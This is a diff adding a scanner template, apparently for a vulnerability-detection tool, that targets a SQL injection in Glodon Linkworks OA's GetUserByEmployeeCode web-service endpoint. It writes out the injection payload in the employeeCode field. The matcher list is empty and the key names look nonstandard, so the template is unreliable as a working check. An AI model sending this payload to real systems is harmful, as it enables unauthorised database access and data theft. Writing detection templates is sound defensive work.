@@ -1,0 +1,19 @@
+id: glodon-linkworks-sqli
+brief:
+    title: Glodon Linkworks GWGdWebService - SQL injection
+    by: DhiyaneshDK
+    level: high
+    about: There is a SQL injection vulnerability in the GWGdWebService interface of Glodon Linkworks office OA. Sensitive information in the database can be obtained after sending a request package.
+    label:
+        - glodon
+        - linkworks
+        - sqli
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/Org/service/Service.asmx/GetUserByEmployeeCode'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: employeeCode=1'-1/user--'&EncryptData=1
+      signs: []
